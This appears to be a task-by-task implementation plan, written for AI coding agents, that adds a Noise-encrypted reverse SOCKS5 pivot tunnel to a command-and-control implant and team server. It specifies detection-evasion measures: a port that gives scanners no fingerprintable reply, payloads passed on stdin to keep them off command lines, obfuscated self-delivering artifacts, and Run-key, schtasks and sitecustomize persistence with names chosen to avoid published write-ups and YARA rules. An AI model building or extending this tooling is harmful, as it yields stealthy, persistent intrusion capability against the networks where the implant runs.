# Reverse SOCKS5 Pivot Tunnel Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Give the operator an ordinary SOCKS5 port on the team server that reaches the network a beacon sits in, with the endpoint running as its own process on the Pi and on any other host, every byte under Noise, and an optional bring-your-own-interpreter path for Windows hosts without Python.

**Architecture:** One implant-facing TCP port carries both command channels and relay channels; the responder learns which from the first authenticated Noise payload, so a `CONNECT`-only proxy and an HTTP redirector can both carry it. The endpoint is a second mode of the same generated artifact, started as `python -` with the source on stdin, so a tunnel that hangs is a child that gets killed and the beacon survives. The Noise implementation lives in `beacon.py` because that is the only file the generator delivers, and the tunnel server imports it from there rather than keeping a second copy.

**Tech Stack:** Python 3.9, stdlib only. No new entry in `software/requirements.txt`.

**Spec:** `docs/superpowers/specs/2026-11-09-reverse-socks-tunnel-design.md`

## Global Constraints

- **No new dependency.** `software/requirements.txt` and `software/agent/requirements.txt` do not grow. The design named `cryptography` as available on the server side; this plan does not use it, because one implementation shared by both sides cannot disagree with itself.
- **Python 3.9.** No `match`, no `X | Y` type unions, no `str.removeprefix`.
- **Everything the endpoint needs must be inside `software/c2/beacon.py`.** `api_beacon_gen` reads exactly that one file (`server.py:1129`). A helper in another module is not delivered and the tunnel mode will fail on target while passing every local test.
- **Noise suite is `Noise_NKpsk0_25519_AESGCM_SHA256`**, exactly. Transport messages are capped at **65535 bytes including the 16-byte tag**.
- **The implant-facing socket is one port.** No second listening port for relays, ever — Squid ships `acl SSL_ports port 443` with `http_access deny CONNECT !SSL_ports`.
- **The port table is keyed by the per-build tunnel identity**, never by `agent_id`. `_assign_name` (`server.py:168`) draws from a word list and `_save_state` (`:217`) is not called on registration, so `agent_id` can repeat after a restart.
- **The team-server process keeps exactly two listening sockets** and gains no protocol parser. The tunnel server is a separate supervised process.
- **No secret on a command line, and no payload on a command line.** Secrets reach a process through its environment; the tunnel child receives its source on stdin.
- **No control that silently does nothing**, and no control that silently takes a beacon interval to act: an endpoint stop shows as pending with the expected time.
- **Hash verification of a dead-drop bundle has no override.**
- Baseline: **2422 tests green in 373 s**, measured 2026-11-09 with the whole-suite command `python3 -m unittest discover -s software/tests -t . -p "test_*.py"`. **That run included the uncommitted concurrent work below**, so it is a reading of the tree as it stood and not of `ca0b093` — re-measure at execution start and use that number. `Port NNNNN is in use` lines and `PIL.PngImagePlugin` debug output are pre-existing noise.
- **`software/c2/beacon.py` had uncommitted concurrent work when this plan was written** — the 10-second sleep-floor finding from `docs/AGENT.md`'s *Known limits* being fixed, with its entry deleted and tests added in `test_beacon.py` and `test_docs.py`. Three consequences for whoever executes this:
  - **Locate every symbol by name, not by the line numbers** in this plan or the design. They were read at commit `31ccf98`; the concurrent change inserts lines at ~1357 and ~4158, so everything below the first insertion has already moved once and will move again when that work lands. Numbers above 1357 — `_load_libcrypto` 101, `_USE_PURE_PYTHON_AES` 329, `_aes_gcm_encrypt` 374, `_aes_gcm_decrypt` 410, `beacon_config_from_fallback` 551, `_NtlmProxyRelay` 648, `_bridge` 898, `ProxyDiscovery` 1065 — are unaffected.
  - Current positions for Task 11's targets, as of writing: `_get_beacon_path` 3282, `_exec_persist` 3285, the Run-key literal 3304, the `schtasks` literal 3323, `_exec_unpersist` 3385. The command dispatch Task 8 extends begins at 4143.
  - **Take the test baseline after that work lands**, not before. A count measured against a mutating tree proves nothing, and Task 11 touches `_exec_persist`, which is in the same file.
- **Never hardcode a port in a test.** Bind `('127.0.0.1', 0)` and read it back. `tls-viewer` holds 8443 and `rdpview` holds 8099 on the development machine.
- Commit style `feat(scope): subject` for new capability, `fix(scope):` for a correction, blank line, prose explaining why.
- No employer email domain anywhere, including commit metadata.
- `software/tests/test_docs.py` holds `docs/AGENT.md`'s *Known limits* with one probe per finding. Fixing a recorded finding fails that test until its entry is deleted.

## Review Focus

Input classes the spec implies that no task's happy path exercises. Each has its test added to the owning task.

- **Garbage on the implant-facing port.** A port scanner, a TLS `ClientHello`, `curl`, four random bytes, an immediate FIN. Expect: no deterministic reply an enumerator could fingerprint, no crash, no unbounded read, and the connection closed on a bounded timer. This is the one that burned the original — `00 00` on connect is how its infrastructure was mapped across providers. → Task 5.
- **A dead drop that answers with the wrong bytes.** A truncated file, an HTML error page served as 200, a captive portal, a bundle whose hash does not match. Expect: refusal on the hash, the next drop tried, and nothing executed. An unverified drop is RCE in our own implant. → Task 13.
- **A SOCKS target the endpoint cannot reach.** Connection refused, no route, DNS failure, a connect that hangs past the timeout. Expect the matching RFC 1928 reply code and a closed session, not a hung operator tool. → Task 7.
- **Hundreds of parallel sessions from one tunnel.** `nmap` against a /24 opens sockets faster than anything else this project has met. Expect no crossed streams, a stated concurrency cap, and a refusal that is visible rather than a silent drop. → Task 6.
- **The team server or the tunnel server restarts while endpoints are connected.** Expect the port table to survive, identities to re-attach to the same ports, and an endpoint whose server vanished to retry rather than exit. → Tasks 5, 7.

---

## File Structure

| File | Responsibility |
|---|---|
| `software/c2/beacon.py` *(modify)* | Implant side, because it is the only delivered file: X25519, HKDF, the Noise state machine, the tunnel endpoint, the `tunnel` commands, the child spawn, the `c2.tunnel` config path, per-build persistence names |
| `software/c2/tunnel/__init__.py` *(new)* | Package marker |
| `software/c2/tunnel/protocol.py` *(new)* | Framing, command-message codec, SOCKS5 codec. Imports the Noise primitives from `beacon.py` — one implementation, no interop risk |
| `software/c2/tunnel/keys.py` *(new)* | Static keypair minting and loading, PSK and identity registry |
| `software/c2/tunnel/server.py` *(new)* | The implant-facing socket, session table, relay pairing, port table |
| `software/c2/tunnel/socks.py` *(new)* | RFC 1928 SOCKS5 server for the operator side, with RFC 1929 auth |
| `software/c2/tunnel/__main__.py` *(new)* | Run the tunnel server as a process with a control socket, mirroring `listeners/__main__.py` |
| `software/c2/stagers/windows.ps1.tmpl`, `posix.sh.tmpl` *(new)* | Stager templates the generator fills |
| `software/c2/server.py` *(modify)* | Generator `tunnel` block, source retention in `_obfuscate_layer`, stager output, tunnel panel routes, supervisor wiring |
| `configs/raccoon.yaml` *(modify)* | `c2.tunnel` (this host as a client) and `c2.tunnel_server` (sockets this host opens) |
| `services/raccoon-tunnel.service` *(new)* | The Pi endpoint as a unit, with an `EnvironmentFile` for the PSK |
| `tools/build_interpreter_bundle.py` *(new)* | Assemble and hash the interpreter bundle; print the `{url, sha256}` entry |
| `software/tests/test_tunnel_*.py` *(new)* | One test module per task group |
| `software/tests/data/vipertunnel*.yar` *(new)* | The two published rules, `vt.` clause removed |
| `docs/TUNNEL.md` *(new)* | What an operator needs to run it |

---

### Task 1: X25519 and HKDF, two backends

**Files:**
- Modify: `software/c2/beacon.py` (new section after the AES block, which ends at `:458`)
- Test: `software/tests/test_tunnel_noise.py`

**Interfaces:**
- Consumes: `_load_libcrypto` (`beacon.py:101`), `_crypto`, `_USE_PURE_PYTHON_AES` (`:329`)
- Produces: `_x25519_keypair() -> Tuple[bytes, bytes]` (private, public); `_x25519(private: bytes, peer_public: bytes) -> bytes`; `_hkdf(chaining_key: bytes, input_material: bytes, num_outputs: int) -> Tuple[bytes, ...]`; `_USE_PURE_PYTHON_X25519: bool`

- [ ] **Step 1: Write the failing tests**

```python
RFC7748_SCALAR = bytes.fromhex("a546e36bf0527c9d3b16154b82465edd62144c0ac1fc5a18506a2244ba449ac4")
RFC7748_U      = bytes.fromhex("e6db6867583030db3594c1a424b15f7c726624ec26b3353b10a903a6d0ab1c4c")
RFC7748_OUT    = bytes.fromhex("c3da55379de9c6908e94ea4df28d084f32eccf03491c71f754b4075577a28552")

def test_x25519_rfc7748_vector(self):          # both backends, same answer
def test_x25519_pure_matches_ctypes(self):     # skip when _crypto is None
def test_x25519_round_trip_shared_secret(self):  # a·B == b·A over fresh keypairs
def test_x25519_rejects_wrong_length(self):    # 31 and 33 bytes both raise
def test_hkdf_rfc5869_case_1(self):            # two and three outputs
```

Use RFC 5869 test case 1 for `_hkdf`, adapted to Noise's calling convention: `HKDF(chaining_key, input_material)` with `chaining_key` as the salt.

- [ ] **Step 2: Run to verify they fail**

Run: `python3 -m unittest software.tests.test_tunnel_noise -v`
Expected: FAIL, `AttributeError` on `_x25519_keypair`.

- [ ] **Step 3: Implement the three functions in `software/c2/beacon.py`**

Mirror the AES pattern exactly: a ctypes path through `_crypto` using `EVP_PKEY_new_raw_private_key`, `EVP_PKEY_derive*` with `NID_X25519`, and a pure-Python Montgomery ladder as the fallback, selected by a module-level `_USE_PURE_PYTHON_X25519`. The ladder is the standard RFC 7748 `X25519` function: clamp the scalar, 255 iterations, conditional swap, invert with `pow(x, p-2, p)`. `_hkdf` is `hmac.new(chaining_key, ...)` per Noise §4.3 — `temp_key = HMAC(ck, ikm)`, then `output_i = HMAC(temp_key, output_{i-1} || i)`.

- [ ] **Step 4: Run to verify they pass**

Run: `python3 -m unittest software.tests.test_tunnel_noise -v`
Expected: PASS. If `_crypto` is None on this machine, `test_x25519_pure_matches_ctypes` reports as skipped — note it in the commit message rather than treating a skip as a pass.

- [ ] **Step 5: Commit**

```bash
git add software/c2/beacon.py software/tests/test_tunnel_noise.py
git commit -m "feat(tunnel): X25519 and HKDF, with the two backends the AES code already has"
```

---

### Task 2: The Noise handshake and transport

**Files:**
- Modify: `software/c2/beacon.py`
- Test: `software/tests/test_tunnel_noise.py`

**Interfaces:**
- Consumes: Task 1's three functions; `_aes_gcm_encrypt`/`_aes_gcm_decrypt` (`beacon.py:374`, `:410`)
- Produces: `NoiseSession` with `initiate(payload: bytes) -> bytes`, `respond(message: bytes) -> bytes` (returns the peer's first payload), `complete(message: bytes) -> None`, `encrypt(plaintext: bytes) -> bytes`, `decrypt(ciphertext: bytes) -> bytes`; constructors `NoiseSession.initiator(server_public: bytes, psk: bytes)` and `NoiseSession.responder(static_private: bytes, psk_lookup: Callable[[], Iterable[bytes]])`

- [ ] **Step 1: Write the failing tests**

```python
def test_nkpsk0_handshake_completes_and_keys_match(self):
def test_first_message_carries_a_payload_the_responder_reads(self):   # the HELLO/RELAY discriminator
def test_wrong_psk_fails_the_handshake(self):                          # raises, and not after leaking a plaintext
def test_responder_tries_several_psks_and_takes_the_matching_one(self)
def test_first_message_is_indistinguishable_without_the_psk(self):     # two sessions, same key, differ in every byte
def test_transport_messages_are_sequenced(self):                        # a replayed frame is refused
def test_message_over_65535_is_refused_by_the_api(self)
def test_decrypt_of_a_tampered_frame_raises(self)
```

- [ ] **Step 2: Run to verify they fail**

Run: `python3 -m unittest software.tests.test_tunnel_noise -v`
Expected: FAIL, `NoiseSession` undefined.

- [ ] **Step 3: Implement `NoiseSession` in `software/c2/beacon.py`**

`NKpsk0` per the Noise spec revision 34: pre-message is the responder's static public key; message 1 is `e, es, psk` carrying a payload; message 2 is `e, ee` carrying a payload; then two `CipherState`s with independent 64-bit counters. `MixKey`, `MixHash` and `MixKeyAndHash` are the only three operations needed on top of Task 1. The nonce is the counter in the low 8 bytes of the 12-byte AES-GCM nonce, big-endian, per the spec. The responder's `psk_lookup` returns candidate PSKs because a deployment holds several; trying each is bounded by that list and each failure is a MAC failure with no distinguishable timing requirement stated here.

- [ ] **Step 4: Run to verify they pass**

Run: `python3 -m unittest software.tests.test_tunnel_noise -v`
Expected: PASS.

- [ ] **Step 5: Commit**

```bash
git add software/c2/beacon.py software/tests/test_tunnel_noise.py
git commit -m "feat(tunnel): the Noise_NKpsk0_25519_AESGCM_SHA256 state machine"
```

---

### Task 3: Framing, command messages and the SOCKS codec

**Files:**
- Create: `software/c2/tunnel/__init__.py`, `software/c2/tunnel/protocol.py`
- Test: `software/tests/test_tunnel_protocol.py`

**Interfaces:**
- Consumes: `NoiseSession` from Task 2, imported as `from software.c2.beacon import NoiseSession`
- Produces: `read_frame(sock) -> bytes` / `write_frame(sock, payload: bytes) -> None` (`>H` length prefix); `MSG_HELLO = 1`, `MSG_RELAY = 2`, `MSG_OPEN_RELAY = 3`, `MSG_PING = 4`, `MSG_PONG = 5`, `MSG_CLOSE = 6`; `encode_message(kind: int, body: dict) -> bytes` / `decode_message(raw: bytes) -> Tuple[int, dict]`; `encode_socks_request(...)`/`decode_socks_request(...)`; `encode_socks_reply(...)`/`decode_socks_reply(...)`; `MAX_PAYLOAD = 65519`

- [ ] **Step 1: Write the failing tests**

```python
def test_frame_round_trip_over_a_socket_pair(self)
def test_frame_longer_than_max_payload_is_refused_before_the_socket(self)
def test_truncated_frame_raises_rather_than_blocking_forever(self)
def test_message_round_trip_for_every_kind(self)
def test_unknown_message_kind_raises(self)
def test_socks_request_round_trip_ipv4_ipv6_and_domain(self)     # ATYP 1, 4, 3
def test_socks_ports_are_big_endian(self)                         # 0x1F90 -> b"\x1f\x90"
def test_socks_reply_zero_is_success(self)                        # RFC 1928, not the original's inversion
def test_bind_and_udp_commands_decode_but_are_flagged_unsupported(self)
```

- [ ] **Step 2: Run to verify they fail**

Run: `python3 -m unittest software.tests.test_tunnel_protocol -v`
Expected: FAIL on the import.

- [ ] **Step 3: Implement `software/c2/tunnel/protocol.py`**

Bodies are compact JSON, because the command channel carries a handful of messages per hour and legibility in a capture of our own test rig is worth more than bytes. `MAX_PAYLOAD` is 65535 minus the 16-byte tag. The module's docstring must state, in the manner of `listeners/quic.py`, which bytes came from the original and which were deliberately changed — ports big-endian, status `0` for success, version bytes restored — because that is the difference a reader will otherwise assume is a bug.

- [ ] **Step 4: Run to verify they pass**

Run: `python3 -m unittest software.tests.test_tunnel_protocol -v`
Expected: PASS.

- [ ] **Step 5: Commit**

```bash
git add software/c2/tunnel/ software/tests/test_tunnel_protocol.py
git commit -m "feat(tunnel): framing, command messages and a SOCKS codec without the original's deviations"
```

---

### Task 4: Keys, PSKs and identities

**Files:**
- Create: `software/c2/tunnel/keys.py`
- Test: `software/tests/test_tunnel_keys.py`

**Interfaces:**
- Consumes: Task 1's `_x25519_keypair`
- Produces: `KeyStore(path)` with `static_public() -> bytes`, `static_private() -> bytes`, `register_build(identity: str, psk: bytes) -> None`, `retire_build(identity: str) -> bool`, `psks() -> List[bytes]`, `identity_for(psk: bytes) -> Optional[str]`, `builds() -> List[dict]`

- [ ] **Step 1: Write the failing tests**

```python
def test_first_use_mints_a_keypair_and_persists_it(self)
def test_second_open_returns_the_same_public_key(self)
def test_private_key_file_is_0600(self)                     # and the directory 0700
def test_register_two_builds_and_both_psks_are_offered(self)
def test_retire_one_build_leaves_the_other_working(self)
def test_identity_for_an_unknown_psk_is_none(self)
def test_a_psk_that_is_not_32_bytes_is_refused_at_registration(self)
def test_store_is_not_world_readable_after_a_registration(self)
```

- [ ] **Step 2: Run to verify they fail**

Run: `python3 -m unittest software.tests.test_tunnel_keys -v`
Expected: FAIL on the import.

- [ ] **Step 3: Implement `software/c2/tunnel/keys.py`**

JSON on disk, `0600`, created with `os.open(..., O_CREAT | O_EXCL, 0o600)` so the mode is right at creation rather than fixed afterwards. The store holds the static private key and a list of `{identity, psk, created}`. Follow `registry.py`'s posture: a malformed store is an error when it is read, naming the file and the field.

- [ ] **Step 4: Run to verify they pass**

Run: `python3 -m unittest software.tests.test_tunnel_keys -v`
Expected: PASS.

- [ ] **Step 5: Commit**

```bash
git add software/c2/tunnel/keys.py software/tests/test_tunnel_keys.py
git commit -m "feat(tunnel): a key store with one PSK per build, so retiring a build is a deletion"
```

---

### Task 5: The tunnel server

**Files:**
- Create: `software/c2/tunnel/server.py`
- Test: `software/tests/test_tunnel_server.py`

**Interfaces:**
- Consumes: Tasks 2, 3, 4
- Produces: `TunnelServer(keystore, bind_host, bind_port, port_range, state_path)` with `start()`, `stop()`, `status() -> List[dict]`, `open_session(identity) -> RelaySession`, `endpoints() -> List[dict]`; `RelaySession` with `token: bytes`, `wait_paired(timeout) -> bool`, `sock` (the paired, decrypted stream)

- [ ] **Step 1: Write the failing tests**

```python
def test_hello_registers_an_endpoint_and_assigns_a_stable_port(self)
def test_the_same_identity_gets_the_same_port_after_a_server_restart(self)   # port table persists
def test_a_second_connection_claiming_a_connected_identity_is_refused(self)
def test_relay_with_the_issued_token_is_paired_to_its_session(self)
def test_relay_with_an_unknown_token_is_refused_and_the_session_stays_open(self)
def test_an_endpoint_whose_implant_id_matches_no_agent_is_reported_unlinked(self)
def test_ping_keeps_an_endpoint_alive_and_a_silent_one_ages_out(self)
def test_the_tunnel_server_never_reads_the_beacon_encryption_key(self)  # no key field anywhere in its config or state
def test_the_tunnel_package_does_not_import_ServerCrypto(self)          # the inverted listener property, pinned

# Review Focus: garbage on the implant-facing port
def test_random_bytes_get_no_deterministic_reply(self)        # two probes, identical input, nothing sent back
def test_tls_client_hello_is_closed_without_a_reply(self)
def test_immediate_fin_does_not_raise_in_the_accept_loop(self)
def test_a_connection_that_sends_nothing_is_closed_on_a_bounded_timer(self)
def test_a_frame_claiming_65535_bytes_that_never_arrives_is_bounded(self)
```

- [ ] **Step 2: Run to verify they fail**

Run: `python3 -m unittest software.tests.test_tunnel_server -v`
Expected: FAIL on the import.

- [ ] **Step 3: Implement `software/c2/tunnel/server.py`**

One accept loop, one thread per connection. The responder completes the Noise handshake, reads the first payload, and dispatches on its kind: `MSG_HELLO` becomes a command channel held open, `MSG_RELAY` is matched against outstanding session tokens. An unauthenticated peer cannot produce a valid message 1, so **the failure path must send nothing at all and close** — any reply, including a reset pattern distinct from a normal close, is the `00 00` mistake again. Port assignments live in `state_path` as JSON keyed by identity, loaded at start; the file is the thing that makes the port stable, not the process.

- [ ] **Step 4: Run to verify they pass**

Run: `python3 -m unittest software.tests.test_tunnel_server -v`
Expected: PASS.

- [ ] **Step 5: Commit**

```bash
git add software/c2/tunnel/server.py software/tests/test_tunnel_server.py
git commit -m "feat(tunnel): one port for command and relay, with the role read from inside the encryption"
```

---

### Task 6: The operator's SOCKS5 port

**Files:**
- Create: `software/c2/tunnel/socks.py`
- Test: `software/tests/test_tunnel_socks.py`

**Interfaces:**
- Consumes: Task 5's `TunnelServer.open_session`; Task 3's SOCKS codec
- Produces: `SocksFront(tunnel_server, identity, bind_port, username, password, max_sessions)` with `start()`, `stop()`, `stats() -> dict`

- [ ] **Step 1: Write the failing tests**

```python
def test_rfc1928_greeting_selects_username_password(self)       # 05 01 02 -> 05 02
def test_no_auth_offered_alone_is_refused(self)                 # 05 01 00 -> 05 FF
def test_correct_credentials_are_accepted(self)                  # RFC 1929, 01 00
def test_wrong_credentials_are_refused_and_the_socket_closed(self)
def test_connect_is_carried_to_the_endpoint_and_bytes_flow_both_ways(self)
def test_bind_is_refused_with_command_not_supported(self)        # reply 0x07
def test_udp_associate_is_refused_with_command_not_supported(self)

# Review Focus: hundreds of parallel sessions
def test_two_hundred_concurrent_connects_do_not_cross_streams(self)   # each gets its own echo back
def test_beyond_max_sessions_the_client_gets_a_general_failure_not_a_silent_drop(self)  # reply 0x01
def test_stats_report_the_refusals(self)
```

Drive the happy paths against a real `TunnelServer` with a stub endpoint, not a mock of either side — the pattern `test_listeners.py` sets out in its docstring.

- [ ] **Step 2: Run to verify they fail**

Run: `python3 -m unittest software.tests.test_tunnel_socks -v`
Expected: FAIL on the import.

- [ ] **Step 3: Implement `software/c2/tunnel/socks.py`**

Standard RFC 1928 with RFC 1929 auth, loopback bind only, refusing a bind address that is not loopback rather than trusting the caller. `max_sessions` has a default stated in the module docstring with its reasoning; crossing it answers `0x01` and counts the refusal, because `nmap` against a /24 will find this limit before anything else does.

- [ ] **Step 4: Run to verify they pass**

Run: `python3 -m unittest software.tests.test_tunnel_socks -v`
Expected: PASS.

- [ ] **Step 5: Commit**

```bash
git add software/c2/tunnel/socks.py software/tests/test_tunnel_socks.py
git commit -m "feat(tunnel): an authenticated SOCKS5 port per identity, because loopback is not isolation"
```

---

### Task 7: The endpoint, as tunnel mode in the beacon

**Files:**
- Modify: `software/c2/beacon.py`
- Test: `software/tests/test_tunnel_endpoint.py`

**Interfaces:**
- Consumes: `NoiseSession` (Task 2); `ProxyDiscovery` (`beacon.py:1065`); `_NtlmProxyRelay` (`:648`) and its `port` property; `_USE_PURE_PYTHON_AES` (`:329`)
- Produces: `TunnelEndpoint(config: dict)` with `run()`, `stop()`; `tunnel_config_problem(config) -> Optional[str]` in the manner of `beacon_key_problem` (`:78`)

- [ ] **Step 1: Write the failing tests**

```python
def test_endpoint_connects_registers_and_appears_on_the_server(self)
def test_endpoint_dials_a_relay_when_asked_and_carries_a_connect(self)
def test_endpoint_carries_a_connect_to_an_ipv6_target(self)         # goal 9, end to end, not only the codec
def test_endpoint_answers_ping_with_pong(self)
def test_endpoint_reconnects_after_the_server_disappears(self)     # Review Focus: server restart
def test_endpoint_connects_through_a_local_connect_proxy(self)      # a stub CONNECT proxy, verifying the request line
def test_config_problem_names_the_missing_field(self)               # each of server, port, public key, psk, identity

# Review Focus: an unreachable SOCKS target
def test_connection_refused_becomes_socks_reply_05(self)
def test_no_route_becomes_socks_reply_03(self)
def test_unresolvable_name_becomes_socks_reply_04(self)
def test_a_connect_that_hangs_past_the_timeout_closes_the_session(self)

# the throughput gate
def test_pure_python_aes_refuses_to_start_and_says_why(self)
def test_the_override_lets_it_start_and_the_status_reports_the_slow_path(self)
```

- [ ] **Step 2: Run to verify they fail**

Run: `python3 -m unittest software.tests.test_tunnel_endpoint -v`
Expected: FAIL, `TunnelEndpoint` undefined.

- [ ] **Step 3: Implement `TunnelEndpoint` and `tunnel_config_problem` in `software/c2/beacon.py`**

The command channel is one long-lived connection with a reconnect loop and the same backoff shape the beacon's transports already use. Each `MSG_OPEN_RELAY` spawns a thread that dials the single server port, handshakes with `MSG_RELAY` and the token, reads the SOCKS request, connects locally, replies, and bridges. Egress order: a configured proxy, then `ProxyDiscovery`, then direct — and when a proxy is used the endpoint writes its own `CONNECT <server>:<port>` and then speaks Noise over the tunnelled stream. Map `errno` to SOCKS reply codes explicitly; a default of `0x01` for anything unmapped.

- [ ] **Step 4: Run to verify they pass**

Run: `python3 -m unittest software.tests.test_tunnel_endpoint -v`
Expected: PASS.

- [ ] **Step 5: Commit**

```bash
git add software/c2/beacon.py software/tests/test_tunnel_endpoint.py
git commit -m "feat(tunnel): the endpoint, reusing the proxy machinery the original never had"
```

---

### Task 8: The child process, and an artifact that can hand over its own source

**Files:**
- Modify: `software/c2/server.py` (`_obfuscate_layer`, `:1156` and `:1248` — **two copies**), `software/c2/beacon.py`
- Test: `software/tests/test_tunnel_spawn.py`

**Interfaces:**
- Consumes: Task 7's `TunnelEndpoint`
- Produces: `Beacon._exec_tunnel(action: str) -> str` handling `start` and `stop`; the generated artifact exposes its own source as the module global `_src` (bytes); mode selection reads `RACCOON_TUNNEL_MODE` from the environment

- [ ] **Step 1: Write the failing tests**

```python
def test_generated_artifact_exposes_its_own_source_as__src(self)    # exec the one-liner, inspect the namespace
def test__src_is_the_innermost_source_not_an_intermediate_layer(self)
def test_source_retention_holds_for_one_layer_and_for_six(self)
def test_tunnel_start_spawns_a_child_whose_cmdline_carries_no_payload(self)  # read /proc or ps output
def test_the_child_receives_the_source_on_stdin(self)
def test_tunnel_stop_terminates_the_child_and_reports_it(self)
def test_tunnel_start_twice_does_not_spawn_a_second_child(self)
def test_a_child_that_dies_is_reported_as_dead_at_the_next_check_in(self)
```

- [ ] **Step 2: Run to verify they fail**

Run: `python3 -m unittest software.tests.test_tunnel_spawn -v`
Expected: FAIL on the missing `_src`.

- [ ] **Step 3: Implement source retention and the spawn**

In `server.py`, change `_obfuscate_layer` so the emitted wrapper binds the decompressed text to the global `_src` before executing it, instead of passing it straight to `exec`. **Both copies must change** — `api_beacon_gen` and `api_beacon_gist` each carry one, which is the kind of duplication this repository has already been bitten by. In `beacon.py`, `_exec_tunnel("start")` spawns `[sys.executable, "-"]` with `RACCOON_TUNNEL_MODE=1` in the child environment, writes `globals()["_src"]` to its stdin and closes it; the config block's bootstrap branches on that variable to run `TunnelEndpoint` instead of `Beacon`. When `_src` is absent — the repository's own source run directly, not a generated artifact — fall back to `__file__` and say which path was used, so a developer running it from a checkout is not debugging a missing global.

- [ ] **Step 4: Run to verify they pass**

Run: `python3 -m unittest software.tests.test_tunnel_spawn -v`
Expected: PASS.

- [ ] **Step 5: Commit**

```bash
git add software/c2/server.py software/c2/beacon.py software/tests/test_tunnel_spawn.py
git commit -m "feat(tunnel): start the endpoint as python - so no payload reaches a command line"
```

---

### Task 9: The generator, the config block, and the Pi

**Files:**
- Modify: `software/c2/server.py` (`_beacon_config_block` `:265`, `gen_cfg` in both generator routes), `software/c2/beacon.py` (`beacon_config_from_fallback` `:551`), `configs/raccoon.yaml`
- Create: `services/raccoon-tunnel.service`
- Test: `software/tests/test_tunnel_config.py`

**Interfaces:**
- Consumes: Task 4's `KeyStore` (for the public key and a freshly registered PSK), Task 7's `tunnel_config_problem`
- Produces: a `tunnel` key in `gen_cfg` carrying `enabled`, `server`, `port`, `public_key`, `psk`, `identity`, `keepalive_seconds`, `allow_slow_crypto`; `beacon_config_from_fallback` returns the same shape from `c2.tunnel`

- [ ] **Step 1: Write the failing tests**

```python
def test_beacon_gen_bakes_a_tunnel_block_when_asked(self)
def test_beacon_gen_registers_the_psk_with_the_key_store(self)
def test_each_generated_build_gets_a_distinct_identity_and_psk(self)
def test_a_build_without_a_tunnel_block_still_runs_as_a_plain_beacon(self)
def test_fallback_config_reads_c2_tunnel_from_the_yaml(self)
def test_the_psk_is_not_read_from_the_yaml(self)               # env only; a psk key in the file is refused with a reason
def test_shipped_yaml_has_the_tunnel_disabled(self)
def test_the_two_yaml_blocks_say_which_side_they_are_in_a_comment(self)
def test_systemd_unit_references_an_environment_file_and_not_a_literal_psk(self)
```

- [ ] **Step 2: Run to verify they fail**

Run: `python3 -m unittest software.tests.test_tunnel_config -v`
Expected: FAIL.

- [ ] **Step 3: Implement the generator and config paths**

`c2.tunnel` is the **client** side and `c2.tunnel_server` the **server** side; both get the comment `registry.py`'s docstring demands, because this repository has already paid for two look-alike blocks that mean opposite things. The PSK reaches the Pi endpoint through `RACCOON_TUNNEL_PSK` and a systemd `EnvironmentFile`, following `RACCOON_LISTENER_TOKEN`; a `psk` key found in the YAML is refused with a message naming the environment variable instead.

- [ ] **Step 4: Run to verify they pass**

Run: `python3 -m unittest software.tests.test_tunnel_config -v`
Expected: PASS.

- [ ] **Step 5: Commit**

```bash
git add software/c2/server.py software/c2/beacon.py configs/raccoon.yaml services/raccoon-tunnel.service software/tests/test_tunnel_config.py
git commit -m "feat(tunnel): one identity and one PSK per build, and a Pi endpoint with no beacon above it"
```

---

### Task 10: Supervision, routes and the panel

**Files:**
- Create: `software/c2/tunnel/__main__.py`
- Modify: `software/c2/server.py` (routes near `:648`, GUI near `:2555` and `:6896`)
- Test: `software/tests/test_tunnel_gui.py`

**Interfaces:**
- Consumes: Task 5's `TunnelServer`, Task 6's `SocksFront`, `Supervisor` (`listeners/supervisor.py:64`)
- Produces: `GET /api/server/tunnel` (server state plus endpoint rows), `POST /api/server/tunnel/<action>` for `start`/`stop`, `POST /api/server/tunnel/endpoint/<identity>/<action>` for `start`/`stop`

- [ ] **Step 1: Write the failing tests**

```python
def test_tunnel_main_prints_a_control_port_line_and_nothing_else_to_stdout(self)
def test_no_secret_is_accepted_as_a_command_line_argument(self)
def test_get_tunnel_lists_endpoints_with_port_sessions_and_crypto_path(self)
def test_server_stop_is_immediate_and_the_response_says_it_drops_every_endpoint(self)
def test_endpoint_stop_queues_a_task_and_reports_pending_with_an_expected_time(self)
def test_endpoint_stop_for_an_unknown_identity_is_404(self)
def test_an_unknown_action_is_404_and_never_reaches_the_supervisor(self)
def test_the_routes_are_operator_socket_only(self)              # agent socket gets the cover answer
def test_an_unlinked_endpoint_is_shown_as_unlinked_not_hidden(self)
```

- [ ] **Step 2: Run to verify they fail**

Run: `python3 -m unittest software.tests.test_tunnel_gui -v`
Expected: FAIL.

- [ ] **Step 3: Implement the entry point, the routes and the panel**

`__main__.py` mirrors `listeners/__main__.py` down to the `control-port <n>` line on stdout and secrets-from-environment rule. The routes mirror `api_listeners`/`api_listener_action`, including the 404-versus-409 distinction. The panel gets its own section with the two objects visually separate: a server block with one start/stop, and endpoint rows whose stop button shows `pending until ~HH:MM` with the agent's interval until the next check-in confirms.

- [ ] **Step 4: Run to verify they pass**

Run: `python3 -m unittest software.tests.test_tunnel_gui -v`
Expected: PASS.

- [ ] **Step 5: Commit**

```bash
git add software/c2/tunnel/__main__.py software/c2/server.py software/tests/test_tunnel_gui.py
git commit -m "feat(tunnel): a panel that separates stopping the server from stopping an endpoint"
```

---

### Task 11: Persistence with generated names, and the sitecustomize hook

**Files:**
- Modify: `software/c2/beacon.py` (`_get_beacon_path` `:3250`, `_exec_persist` `:3253`, `_exec_unpersist` `:3353`), `software/c2/server.py` (`gen_cfg`)
- Test: `software/tests/test_tunnel_persistence.py`

**Interfaces:**
- Consumes: the config block from Task 9
- Produces: a `persistence` key in `gen_cfg` with `name`, `base_dir`, `payload_name`, `gate` (`"path"` or `"argc"`); `render_sitecustomize(payload_name: str, gate: str) -> str`

- [ ] **Step 1: Write the failing tests**

```python
def test_persist_uses_the_generated_name_not_SystemHealthMonitor(self)
def test_unpersist_removes_the_same_generated_name(self)
def test_two_builds_get_different_persistence_names(self)
def test_an_artifact_without_a_persistence_block_keeps_todays_behaviour(self)
def test_sitecustomize_for_the_path_gate_has_no_argc_check(self)
def test_sitecustomize_for_the_argc_gate_calls_Py_GetArgcArgv(self)
def test_the_default_gate_is_path(self)
def test_rendered_sitecustomize_compiles(self)                      # compile(), not exec
def test_the_rendered_hook_names_no_literal_from_the_write_up(self)  # not cp49s, not a .dll payload name
```

- [ ] **Step 2: Run to verify they fail**

Run: `python3 -m unittest software.tests.test_tunnel_persistence -v`
